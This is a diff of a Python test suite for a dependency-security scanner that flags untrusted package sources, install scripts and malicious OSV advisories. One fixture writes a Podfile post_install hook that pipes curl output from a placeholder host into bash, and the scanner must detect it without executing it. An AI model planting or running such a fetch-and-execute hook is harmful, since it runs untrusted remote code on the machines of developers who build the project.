@@ -9,7 +9,7 @@ from unittest.mock import patch
 
 from supply_guard.cli import main, scan_sources
 from supply_guard.core import Dependency, Scan
-from supply_guard.intelligence import local_advisories, online, osv_query, pub_hashes, query_for
+from supply_guard.intelligence import local_advisories, online, osv_query, osv_query_batch, pub_hashes, query_for
 
 
 class GuardTests(unittest.TestCase):
@@ -67,8 +67,16 @@ class GuardTests(unittest.TestCase):
         self.assertFalse((self.root / "forbidden").exists())
 
     def test_scripts_are_detected_not_executed(self):
-        self.write("ios/Podfile", "post_install do\n system('curl https://evil.invalid/payload | bash')\nend\n")
+        self.write("ios/Podfile", "source 'https://evil.invalid/specs.git'\npost_install do\n system('curl https://evil.invalid/payload | bash')\nend\n")
         self.assertTrue({"REMOTE_EXEC", "INSTALL_SCRIPT", "SOURCE_UNTRUSTED"} <= self.rules(Scan(self.root).inventory()))
+
+    def test_runtime_urls_are_not_dependency_sources(self):
+        self.write("ios/Pods/Example/Example.m", 'NSURL *url = [NSURL URLWithString:@"http://runtime.invalid/api"];')
+        self.assertNotIn("SOURCE_UNTRUSTED", self.rules(Scan(self.root).inventory()))
+
+    def test_gradle_repository_url_is_checked(self):
+        self.write("android/build.gradle", "repositories { maven { url 'https://mirror.invalid/repository' } }\n")
+        self.assertIn("SOURCE_UNTRUSTED", self.rules(Scan(self.root).inventory()))
 
     def test_missing_native_locks(self):
         (self.root / "android").mkdir()
@@ -130,6 +138,15 @@ class GuardTests(unittest.TestCase):
         with self.assertRaises(ValueError):
             osv_query({}, lambda *args: {"next_page_token": "same"})
 
+    def test_osv_batch_preserves_order_and_hydrates(self):
+        def fetch(url, payload=None):
+            if url.endswith("querybatch"):
+                return {"results": [{"vulns": [{"id": "MAL-a"}]}, {"vulns": []}]}
+            return {"id": "MAL-a", "summary": "bad"}
+        result = osv_query_batch([{"commit": "a" * 40}, {"commit": "b" * 40}], fetch)
+        self.assertEqual(result[0][0]["id"], "MAL-a")
+        self.assertEqual(result[1], [])
+
     def test_network_failure_is_not_clean(self):
         self.pub()
         scan = Scan(self.root).inventory()
@@ -142,7 +159,11 @@ class GuardTests(unittest.TestCase):
     def test_malicious_advisory_is_critical(self):
         self.pub()
         scan = Scan(self.root).inventory()
-        online(scan, lambda *args: {"vulns": [{"id": "MAL-test", "summary": "Malicious"}]})
+        def fetch(url, payload=None):
+            if url.endswith("querybatch"):
+                return {"results": [{"vulns": [{"id": "MAL-test"}]}]}
+            return {"id": "MAL-test", "summary": "Malicious"}
+        online(scan, fetch)
         self.assertEqual(scan.findings[0]["severity"], "critical")
 
     def test_cocoapods_does_not_use_invented_osv_ecosystem(self):
